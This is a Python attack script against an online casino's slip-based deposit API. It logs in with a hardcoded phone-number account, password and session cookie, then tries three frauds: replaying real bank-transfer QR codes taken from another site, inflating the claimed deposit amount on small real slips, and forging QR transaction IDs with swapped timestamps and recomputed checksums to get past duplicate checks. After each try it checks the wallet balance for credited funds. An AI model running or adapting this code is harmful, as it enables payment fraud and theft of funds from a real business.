#!/usr/bin/env python3
"""probe_matchslip.py — Submit real KBANK QRs from slip.json to vak88z2.

   Strategy: cross-tenant replay of real QRs (we88s.plus → vak88z2).
   vak88z2 has never seen these QRs → passes dedup.
   If bank verification checks tx_ref+amount only (not destination) → auto-credit.
   Also tries amount inflation: submit small real QR with large deposit_amount.
"""
import base64, json, pathlib, requests, time

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type":"application/json"},
        json={"strategy":"local","username":"0972571110","password":"Pwned2026!"},
        timeout=15)
    if r.status_code in (200,201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance","?") if r.ok else f"ERR:{r.status_code}"

def sign_and_upload():
    sr = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR,
                       json={"filename":"slip.png","content_type":"image/png","size":1024},
                       timeout=15)
    if not sr.ok:
        return None, None
    fn = sr.json().get("filename","slip.png")
    url = sr.json().get("urlUpload","")
    if url:
        minimal_png = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
            b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
            b'\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        requests.put(url, headers={"Content-Type":"image/png"}, data=minimal_png, timeout=20)
    # upload-slip step
    usl = requests.post(f"{MGAPI}/mb/upload-slip", headers=HDR,
                        json={"filename": fn, "fileOriginalName": "slip.png",
                              "contentType": "image/png", "size": 1024},
                        timeout=15)
    return fn, usl.ok

print(f"wallet before: {wallet()}")

# ── Load real QRs from slip.json ──────────────────────────────────────────────
slips = json.loads(pathlib.Path("nuxt/slip.json").read_text()).get("slips", [])
print(f"Loaded {len(slips)} slips from slip.json")

# Pick slips going TO the casino (receiver is X5332-x), sorted by amount descending
casino_deposits = [s for s in slips if s.get("receiver_account","").endswith("X5332-x")]
print(f"Casino deposit slips: {len(casino_deposits)}")

# ── 1. Cross-tenant replay: exact QR strings ─────────────────────────────────
print("\n=== 1. Cross-tenant QR replay (exact) ===")
for slip in casino_deposits[:5]:
    fn, ok = sign_and_upload()
    qr = slip["qr_data"]
    amt = slip["amount"]
    ref = slip["tx_ref"]
    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json={"payment_bank_information_id": BANK_INFO,
                            "deposit_amount": int(amt),
                            "deposit_account_id": DEP_ACCT,
                            "slip_image_url": fn or "slip.png",
                            "qr_string": qr},
                      timeout=15)
    status = r.json() if r.headers.get("content-type","").startswith("application/json") else r.text
    en_msg = ""
    if isinstance(status, dict):
        en_msg = status.get("message", {}).get("en","") if isinstance(status.get("message"),dict) else str(status.get("message",""))
    print(f"  [{ref[:8]}] amt={amt} → HTTP {r.status_code}: {en_msg or str(status)[:80]}")
    if r.status_code in (200, 201) and "success" in str(status).lower():
        print(f"  [!!!] ACCEPTED! Checking wallet...")
        time.sleep(8)
        print(f"  wallet: {wallet()}")
    time.sleep(1)

time.sleep(3)
print(f"wallet after exact replay: {wallet()}")

# ── 2. Amount inflation: submit small real QR with inflated deposit_amount ────
print("\n=== 2. Amount inflation attack ===")
for slip in casino_deposits[:3]:
    fn, ok = sign_and_upload()
    qr = slip["qr_data"]
    real_amt = slip["amount"]
    inflated = 10000  # Submit as 10,000 THB

    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json={"payment_bank_information_id": BANK_INFO,
                            "deposit_amount": inflated,
                            "deposit_account_id": DEP_ACCT,
                            "slip_image_url": fn or "slip.png",
                            "qr_string": qr},
                      timeout=15)
    status = r.json() if r.headers.get("content-type","").startswith("application/json") else r.text
    en_msg = ""
    if isinstance(status, dict):
        en_msg = status.get("message", {}).get("en","") if isinstance(status.get("message"),dict) else str(status.get("message",""))
    print(f"  [{slip['tx_ref'][:8]}] real={real_amt} inflated={inflated} → HTTP {r.status_code}: {en_msg or str(status)[:80]}")
    if r.status_code in (200, 201) and "success" in str(status).lower():
        print(f"  [!!!] ACCEPTED! Checking wallet...")
        time.sleep(10)
        print(f"  wallet: {wallet()}")
    time.sleep(1)

time.sleep(3)
print(f"wallet after inflation: {wallet()}")

# ── 3. Modified timestamp QR (dedup bypass from memory: timestamp swap → success) ─
print("\n=== 3. Timestamp-swapped QR (dedup bypass) ===")
import time as time_mod

def swap_timestamp_qr(original_qr, new_ts9=None):
    """Swap the ts9 portion of a KBANK QR with today's timestamp."""
    import datetime
    prefix = "004100060000010103004022001"  # 27 chars fixed
    suffix_start = "5102TH9104"
    if not original_qr.startswith(prefix):
        return original_qr
    txid_part = original_qr[27:27+18]  # 18 chars
    suffix = original_qr[27+18:]  # 5102TH9104XXXX
    # Build new ts9 for today
    now = datetime.datetime.now()
    y = str(now.year)[-1]  # last digit of year
    m = now.month
    d = now.day
    H = now.hour
    M = now.minute
    S = now.second
    if m < 10:
        ts9 = f"{m}{d:02d}{H:02d}{M:02d}{S:02d}"[:9]
    else:
        ts9 = f"{m:02d}{d:02d}{H:02d}{M:02d}{S}"[:9]  # truncate seconds
    letter = txid_part[10]  # keep original letter (A/B/C/D)
    tf = "TF"
    ref5 = txid_part[13:18]  # keep original ref5
    new_txid = f"{y}{ts9}{letter}{tf}{ref5}"
    # Rebuild QR without CRC (first 55 chars)
    qr_no_crc = prefix + new_txid + "5102TH9104"
    # Compute CRC-16/CCITT
    crc = 0xFFFF
    for byte in qr_no_crc.encode():
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
        crc &= 0xFFFF
    new_qr = qr_no_crc + f"{crc:04X}"
    return new_qr

for slip in casino_deposits[:3]:
    fn, ok = sign_and_upload()
    original_qr = slip["qr_data"]
    new_qr = swap_timestamp_qr(original_qr)
    ref = slip["tx_ref"]
    amt = slip["amount"]
    print(f"  [{ref[:8]}] original: {original_qr}")
    print(f"  [{ref[:8]}] modified: {new_qr}")
    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json={"payment_bank_information_id": BANK_INFO,
                            "deposit_amount": int(amt),
                            "deposit_account_id": DEP_ACCT,
                            "slip_image_url": fn or "slip.png",
                            "qr_string": new_qr},
                      timeout=15)
    status = r.json() if r.headers.get("content-type","").startswith("application/json") else r.text
    en_msg = ""
    if isinstance(status, dict):
        en_msg = status.get("message", {}).get("en","") if isinstance(status.get("message"),dict) else str(status.get("message",""))
    print(f"  → HTTP {r.status_code}: {en_msg or str(status)[:80]}")
    if "success" in str(status).lower() and r.status_code in (200,201):
        print(f"  [!!!] ACCEPTED! Wallet check...")
        time.sleep(8)
        print(f"  wallet: {wallet()}")
    time.sleep(2)

time.sleep(5)
print(f"\nFINAL wallet: {wallet()}")
print("=== DONE ===")
